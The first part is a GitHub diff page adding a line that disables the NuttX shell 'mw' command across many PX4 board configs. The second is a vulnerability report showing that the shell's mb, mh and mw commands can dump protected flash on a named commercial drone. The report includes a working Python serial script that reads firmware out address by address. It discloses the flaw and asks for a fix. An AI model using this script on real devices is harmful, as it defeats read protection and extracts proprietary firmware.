[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/nxp/fmuk66-v3/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -147,6 +147,7 @@ CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKFIFO=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
|  |  | CONFIG\_NSH\_DISABLE\_REBOOT=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/nxp/fmuk66-v3/nuttx-config/socketcan/defconfig](#diff-a445b2e9612c1b2478a3faf8adbc170432b5fbcbb0d03df26250c81986e29aa8 "boards/nxp/fmuk66-v3/nuttx-config/socketcan/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/nxp/fmuk66-v3/nuttx-config/socketcan/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -144,6 +144,7 @@ CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKFIFO=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
|  |  | CONFIG\_NSH\_DISABLE\_REBOOT=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/omnibus/f4sd/nuttx-config/nsh/defconfig](#diff-a462c2f9c0e4ad1ed2255cd1c9ff33638c6dbc8bc2213e82185a9d2fe84c6a96 "boards/omnibus/f4sd/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/omnibus/f4sd/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -82,6 +82,7 @@ CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKFIFO=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
|  |  | CONFIG\_NSH\_DISABLE\_REBOOT=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/px4/fmu-v2/nuttx-config/nsh/defconfig](#diff-75391be2d68abab743e66dc4c3a72ffafa2f38ed89b33b31bd65fcda6185d965 "boards/px4/fmu-v2/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/px4/fmu-v2/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -106,6 +106,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_PSSTACKUSAGE=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/px4/fmu-v3/nuttx-config/nsh/defconfig](#diff-1ebd550e4d55222a0abd3d8e92530dd0594de2fbb70a88a6a2c971b9911f73c7 "boards/px4/fmu-v3/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/px4/fmu-v3/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -101,6 +101,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/px4/fmu-v4/nuttx-config/nsh/defconfig](#diff-62cd86817e4c6200d07adb435c993f4390bc210e71d6cef72bb6105ecfce3a25 "boards/px4/fmu-v4/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/px4/fmu-v4/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -101,6 +101,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/px4/fmu-v4pro/nuttx-config/nsh/defconfig](#diff-e7c372de306dda588c08f347d8096f77c108779e01c9a14141e069cce0aa114f "boards/px4/fmu-v4pro/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/px4/fmu-v4pro/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -101,6 +101,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/px4/fmu-v5/nuttx-config/debug/defconfig](#diff-591e80652067fff88bf03bc9644d8fcca9a369441da6a80acb9e8eb176aeb05e "boards/px4/fmu-v5/nuttx-config/debug/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/px4/fmu-v5/nuttx-config/debug/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -150,6 +150,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/px4/fmu-v5/nuttx-config/nsh/defconfig](#diff-ece25f8407d956c983b8998926fff6e432d6165acf23a1d6e4e358eb0179e807 "boards/px4/fmu-v5/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/px4/fmu-v5/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -106,6 +106,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/px4/fmu-v5/nuttx-config/optimized/defconfig](#diff-8e66c8ce677a02864e738368cdba9b54266bcd3864b947fc84ffad6e7c4d752f "boards/px4/fmu-v5/nuttx-config/optimized/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/px4/fmu-v5/nuttx-config/optimized/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -107,6 +107,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/px4/fmu-v5/nuttx-config/stackcheck/defconfig](#diff-da3e33e2335a2878e37d31e97d8f87b14981b201da57a1e0ffea97cb2259db47 "boards/px4/fmu-v5/nuttx-config/stackcheck/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/px4/fmu-v5/nuttx-config/stackcheck/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -107,6 +107,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/px4/fmu-v5/nuttx-config/uavcanv1/defconfig](#diff-320d6d5441176456ba673fc9dd777654fc37d83c907fb69409b8ba1be0f413ea "boards/px4/fmu-v5/nuttx-config/uavcanv1/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/px4/fmu-v5/nuttx-config/uavcanv1/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -108,6 +108,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/px4/fmu-v5x/nuttx-config/base\_phy\_DP83848C/defconfig](#diff-0205edc9dda340c12c172b070b0769e958d33b35ee49a343d91435729fbf9246 "boards/px4/fmu-v5x/nuttx-config/base_phy_DP83848C/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/px4/fmu-v5x/nuttx-config/base_phy_DP83848C/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -135,6 +135,7 @@ CONFIG\_NSH\_CMDPARMS=y |
|  |  | CONFIG\_NSH\_CROMFSETC=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
|  |  | CONFIG\_NSH\_NESTDEPTH=8 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/px4/fmu-v5x/nuttx-config/nsh/defconfig](#diff-c089b25f51ae641d36edeb322d51850a8b57f0ddd27279c5bbe8afd628335171 "boards/px4/fmu-v5x/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/px4/fmu-v5x/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -135,6 +135,7 @@ CONFIG\_NSH\_CMDPARMS=y |
|  |  | CONFIG\_NSH\_CROMFSETC=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
|  |  | CONFIG\_NSH\_NESTDEPTH=8 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/px4/fmu-v6u/nuttx-config/nsh/defconfig](#diff-3bfa2588f363eb2ffbf4322c298e2270d8b0164b67a77dd4b99beaef92de6e4a "boards/px4/fmu-v6u/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/px4/fmu-v6u/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -106,6 +106,7 @@ CONFIG\_NSH\_CMDPARMS=y |
|  |  | CONFIG\_NSH\_CROMFSETC=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
|  |  | CONFIG\_NSH\_NESTDEPTH=8 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/px4/fmu-v6x/nuttx-config/nsh/defconfig](#diff-a828949b4ef7b9b7af0c7a79e104d92abe7458b5a269dbb177aec07b89b8e6f9 "boards/px4/fmu-v6x/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/px4/fmu-v6x/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -135,6 +135,7 @@ CONFIG\_NSH\_CMDPARMS=y |
|  |  | CONFIG\_NSH\_CROMFSETC=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
|  |  | CONFIG\_NSH\_NESTDEPTH=8 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/spracing/h7extreme/nuttx-config/nsh/defconfig](#diff-be6ab114a9d0f070c635ebcd064c24c89336f587c81d1d65753fbde7ffb0b5a4 "boards/spracing/h7extreme/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/spracing/h7extreme/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -100,6 +100,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/uvify/core/nuttx-config/nsh/defconfig](#diff-6b50c223adaee02495c3273c6fc57515aa16f1aa28462ffdcba4520a55979c6b "boards/uvify/core/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/uvify/core/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -101,6 +101,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from gist.github.com_ab54b3cf_20250114_204332.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fswkim101%2Ff473b9a60e6d4635268402a2cd2025ac)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fswkim101%2Ff473b9a60e6d4635268402a2cd2025ac&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fswkim101%2Ff473b9a60e6d4635268402a2cd2025ac) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fswkim101%2Ff473b9a60e6d4635268402a2cd2025ac&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@swkim101](https://avatars.githubusercontent.com/u/72803908?s=64&v=4)](/swkim101)

# [swkim101](/swkim101)/**[vulnerability report.md](/swkim101/f473b9a60e6d4635268402a2cd2025ac)** Secret

Last active
March 8, 2021 09:41

Show Gist options

* [Download ZIP](/swkim101/f473b9a60e6d4635268402a2cd2025ac/archive/46078df41cd7721117dbfed291830b93145ecafa.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fswkim101%2Ff473b9a60e6d4635268402a2cd2025ac)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fswkim101%2Ff473b9a60e6d4635268402a2cd2025ac)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/swkim101/f473b9a60e6d4635268402a2cd2025ac.js&quot;&gt;&lt;/script&gt;
* Save swkim101/f473b9a60e6d4635268402a2cd2025ac to your computer and use it in GitHub Desktop.

[Code](/swkim101/f473b9a60e6d4635268402a2cd2025ac)
[Revisions
7](/swkim101/f473b9a60e6d4635268402a2cd2025ac/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/swkim101/f473b9a60e6d4635268402a2cd2025ac.js&quot;&gt;&lt;/script&gt;

Save swkim101/f473b9a60e6d4635268402a2cd2025ac to your computer and use it in GitHub Desktop.

[Download ZIP](/swkim101/f473b9a60e6d4635268402a2cd2025ac/archive/46078df41cd7721117dbfed291830b93145ecafa.zip)

adsf

 [Raw](/swkim101/f473b9a60e6d4635268402a2cd2025ac/raw/46078df41cd7721117dbfed291830b93145ecafa/vulnerability%2520report.md)

[**vulnerability report.md**](#file-vulnerability-report-md)

# Nsh's mb, mh, and mw commands are dangerous.

Exploiting those commands makes it possible to extract firmware from the flash memory because mb, mh, and mw can read the firmware code at an arbitrary location.
You may know that some commercial vendors can customize the firmware without opening even binary code.
However, those commands can neutralize the intellectual protection scheme to prevent from reading binary firmware code.

For instance, [Yuneec](https://us.yuneec.com/), a commercial drone vendor, has sold multiple drone models such as Typhoon H.
Meanwhile, the `mb 0x8000000` command naively prints Typhoon H's firmware binary code.

FYI, the drone vendor has made efforts to protect its firmware from reading out, applying [ST's hardware read protection](https://www.st.com/resource/en/application_note/dm00186528-proprietary-code-read-out-protection-on-microcontrollers-of-the-stm32f4-series-stmicroelectronics.pdf) to its drones.

Nevertheless, Nuttx's commands unintentionally help to bypass the protection scheme.

PoC is as follows:

```
import serial
ser = serial.Serial(
   port='COM7',\
   baudrate=57600,\
   parity=serial.PARITY_NONE,\
   stopbits=serial.STOPBITS_ONE,\
   bytesize=serial.EIGHTBITS,\
   timeout=0)
f = open('output_db000.txt', 'wb')
for addr in range(0x080db000, 0x08200000, 0x1000):
   count = 0
   ser.write(b'mw ')
   ser.write(bytes(hex(addr), 'ascii'))
   ser.write(b' 1000\r\n')
   print(hex(addr))
   while True:
       line = ser.readline()
       f.write(line)
       #print(line)

       if(len(line) <= 5 and count != 0):
           break
       count += 1
f.close()
```

Only if possible, we believe the best way to prevent this vulnerability is to remove mb, mh, and mw commands.
If that is not allowed due to debugging purpose, we would like to suggest the following actions can help protect intellectual properties from this vulnerability:

(1) please add comments in the source code.

(2) please show warnings in compile messages.

(3) please disable those commands in the default configuration (`CONFIG_NSH_DISABLE_MW=y`)

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
